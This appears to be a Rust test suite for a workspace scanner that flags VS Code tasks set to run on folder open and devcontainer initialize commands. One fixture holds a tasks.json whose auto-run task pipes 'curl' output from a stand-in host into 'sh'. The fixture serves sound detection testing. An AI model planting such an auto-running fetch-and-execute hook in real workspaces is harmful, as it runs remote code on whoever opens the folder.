use std::fs;
use std::path::Path;

use serde_json::{json, Value};

use super::*;

const FOLDER_OPEN: &str = r#"{
  // Runs the moment the folder opens.
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "curl -s https://example.test/x | sh",
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}"#;
const INITIALIZE: &str = r#"{"name": "app", "initializeCommand": "bash .devcontainer/init.sh"}"#;

fn request(root: &Path) -> SnapshotRequest {
    SnapshotRequest {
        root: root.to_str().unwrap().to_owned(),
        mode: SnapshotMode::Content,
        max_entries: 0,
        max_total_bytes: 0,
        max_file_bytes: 0,
        max_visited_entries: 0,
        secrets: false,
        secret_key: None,
        skills: false,
        hooks: false,
        plugins: false,
        workflows: false,
        editor_tasks: true,
    }
}

fn scan(root: &Path) -> Value {
    snapshot(&request(root)).unwrap()["editor_tasks"].clone()
}

fn write(root: &Path, relative: &str, content: &str) {
    let path = root.join(relative);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, content).unwrap();
}

fn found(scan: &Value) -> Vec<(String, String)> {
    scan["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|finding| {
            (
                finding["path"].as_str().unwrap().to_owned(),
                finding["rule_id"].as_str().unwrap().to_owned(),
            )
        })
        .collect()
}

#[test]
fn a_folder_open_task_and_a_host_command_are_reported_without_their_text() {
    let root = tempfile::tempdir().unwrap();
    write(root.path(), ".vscode/tasks.json", FOLDER_OPEN);
    write(root.path(), ".devcontainer/devcontainer.json", INITIALIZE);

    let tasks = scan(root.path());

    assert_eq!(tasks["schema"], "guard.workspace-editor-tasks.v1");
    assert_eq!(tasks["detector_version"], "editor-task-v1");
    assert_eq!(tasks["status"], "complete");
    assert_eq!(tasks["files_scanned"], 2);
    assert_eq!(
        found(&tasks),
        [
            (
                ".devcontainer/devcontainer.json".to_owned(),
                "devcontainer.initialize-command".to_owned()
            ),
            (
                ".vscode/tasks.json".to_owned(),
                "editor.task.folder-open".to_owned()
            ),
        ]
    );
    let text = tasks.to_string();
    for quoted in ["curl", "example.test", "init.sh", "setup"] {
        assert!(!text.contains(quoted), "{quoted}");
    }
    let finding = &tasks["findings"][1];
    assert_eq!(finding["severity"], "high");
    assert_eq!(finding["category"], "execution");
    assert_eq!(finding["finding_id"].as_str().unwrap().len(), 32);
}

#[test]
fn only_root_editor_and_dev_container_configurations_are_read() {
    let root = tempfile::tempdir().unwrap();
    write(root.path(), "app.code-workspace", FOLDER_OPEN);
    write(root.path(), ".devcontainer.json", INITIALIZE);
    write(
        root.path(),
        ".devcontainer/python/devcontainer.json",
        INITIALIZE,
    );
    for (ignored, text) in [
        ("packages/app/.vscode/tasks.json", FOLDER_OPEN),
        ("packages/app/app.code-workspace", FOLDER_OPEN),
        (".vscode/launch.json", FOLDER_OPEN),
        (".vscode/nested/tasks.json", FOLDER_OPEN),
        (".devcontainer/a/b/devcontainer.json", INITIALIZE),
        ("packages/app/.devcontainer/devcontainer.json", INITIALIZE),
        ("tasks.json", FOLDER_OPEN),
    ] {
        write(root.path(), ignored, text);
    }

    let tasks = scan(root.path());

    assert_eq!(tasks["status"], "complete");
    assert_eq!(tasks["files_scanned"], 3);
    let paths: Vec<String> = found(&tasks).into_iter().map(|(path, _)| path).collect();
    assert_eq!(
        paths,
        [
            ".devcontainer.json",
            ".devcontainer/python/devcontainer.json",
            "app.code-workspace",
        ]
    );
}

#[test]
fn ordinary_configurations_and_a_project_without_them_are_quiet_and_complete() {
    let root = tempfile::tempdir().unwrap();
    write(
        root.path(),
        ".vscode/tasks.json",
        r#"{"version": "2.0.0", "tasks": [{"label": "build", "command": "npm run build"}]}"#,
    );
    write(
        root.path(),
        ".devcontainer/devcontainer.json",
        r#"{"image": "mcr.microsoft.com/devcontainers/base", "postCreateCommand": "npm ci"}"#,
    );

    let tasks = scan(root.path());
    assert_eq!(tasks["status"], "complete");
    assert_eq!(tasks["files_scanned"], 2);
    assert!(found(&tasks).is_empty());

    let empty = tempfile::tempdir().unwrap();
    write(empty.path(), "README.md", "hello");
    let tasks = scan(empty.path());
    assert_eq!(tasks["status"], "complete");
    assert_eq!(tasks["files_scanned"], 0);
}

#[test]
fn a_configuration_that_is_not_text_or_does_not_parse_leaves_the_scan_incomplete() {
    let root = tempfile::tempdir().unwrap();
    let path = root.path().join(".vscode/tasks.json");
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, [0xff, 0xfe, b'{', b'}']).unwrap();
    let tasks = scan(root.path());
    assert_eq!(tasks["status"], "incomplete");
    assert_eq!(tasks["truncation_reasons"], json!(["editor_task_not_text"]));

    let root = tempfile::tempdir().unwrap();
    write(
        root.path(),
        ".vscode/tasks.json",
        r#"{"tasks": [{"runOptions": {"runOn": "folderOpen"}} "#,
    );
    let tasks = scan(root.path());
    assert_eq!(tasks["status"], "incomplete");
    assert_eq!(tasks["skipped"]["unparsed"], 1);
    assert_eq!(tasks["truncation_reasons"], json!(["editor_task_unparsed"]));
    assert_eq!(found(&tasks).len(), 1);
}

#[test]
fn a_configuration_the_snapshot_left_out_leaves_the_scan_incomplete() {
    let root = tempfile::tempdir().unwrap();
    write(root.path(), ".vscode/tasks.json", FOLDER_OPEN);
    let mut request = request(root.path());
    request.max_file_bytes = 16;

    let tasks = snapshot(&request).unwrap()["editor_tasks"].clone();

    assert_eq!(tasks["status"], "incomplete");
    assert_eq!(tasks["skipped"]["unread"], 1);
    assert!(tasks["truncation_reasons"]
        .as_array()
        .unwrap()
        .contains(&json!("editor_task_unread")));
    assert!(found(&tasks).is_empty());
}

#[cfg(unix)]
#[test]
fn a_linked_configuration_leaves_the_scan_incomplete() {
    for (link, target) in [
        (".vscode/tasks.json", "shared/vscode/tasks.json"),
        (".vscode", "shared/vscode"),
        (".devcontainer", "shared/devcontainer"),
        (".devcontainer/python", "shared/devcontainer"),
        (
            ".devcontainer.json",
            "shared/devcontainer/devcontainer.json",
        ),
    ] {
        let root = tempfile::tempdir().unwrap();
        write(root.path(), "shared/vscode/tasks.json", FOLDER_OPEN);
        write(
            root.path(),
            "shared/devcontainer/devcontainer.json",
            INITIALIZE,
        );
        let path = root.path().join(link);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(root.path().join(target), &path).unwrap();

        let tasks = scan(root.path());

        assert_eq!(tasks["status"], "incomplete", "{link}");
        assert_eq!(
            tasks["truncation_reasons"],
            json!(["editor_task_linked"]),
            "{link}"
        );
    }

    let root = tempfile::tempdir().unwrap();
    write(root.path(), "shared/notes.md", "notes");
    std::os::unix::fs::symlink(root.path().join("shared"), root.path().join("docs")).unwrap();
    assert_eq!(scan(root.path())["status"], "complete");
}

#[cfg(unix)]
#[test]
fn only_a_special_file_where_a_configuration_belongs_leaves_the_scan_incomplete() {
    fn pipe(root: &Path, relative: &str) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        let status = std::process::Command::new("mkfifo")
            .arg(&path)
            .status()
            .expect("mkfifo runs");
        assert!(status.success(), "the fixture pipe");
    }

    let root = tempfile::tempdir().unwrap();
    write(root.path(), ".devcontainer/devcontainer.json", INITIALIZE);
    pipe(root.path(), ".devcontainer/agent.sock");
    let tasks = scan(root.path());
    assert_eq!(tasks["status"], "complete");
    assert_eq!(tasks["skipped"]["linked"], 0);

    let root = tempfile::tempdir().unwrap();
    pipe(root.path(), ".devcontainer/devcontainer.json");
    let tasks = scan(root.path());
    assert_eq!(tasks["status"], "incomplete");
    assert_eq!(tasks["truncation_reasons"], json!(["editor_task_linked"]));
}

#[test]
fn findings_are_stable_and_one_per_rule_and_file() {
    let root = tempfile::tempdir().unwrap();
    write(root.path(), ".vscode/tasks.json", FOLDER_OPEN);
    write(root.path(), "a.code-workspace", FOLDER_OPEN);
    write(root.path(), ".devcontainer.json", INITIALIZE);

    let first = scan(root.path());
    let second = scan(root.path());

    assert_eq!(first["findings"], second["findings"]);
    let ids: std::collections::BTreeSet<&str> = first["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|finding| finding["finding_id"].as_str().unwrap())
        .collect();
    assert_eq!(ids.len(), 3);
}

#[test]
fn the_editor_task_scan_runs_only_when_asked_and_needs_content_mode() {
    let root = tempfile::tempdir().unwrap();
    write(root.path(), ".vscode/tasks.json", FOLDER_OPEN);
    let mut request = request(root.path());
    let with_tasks = snapshot(&request).unwrap();
    request.editor_tasks = false;
    let without = snapshot(&request).unwrap();

    assert!(without.get("editor_tasks").is_none());
    assert_eq!(with_tasks["snapshot_digest"], without["snapshot_digest"]);

    request.editor_tasks = true;
    request.mode = SnapshotMode::Stat;
    assert_eq!(
        snapshot(&request).unwrap_err(),
        "workspace_snapshot_editor_tasks_need_content"
    );
}
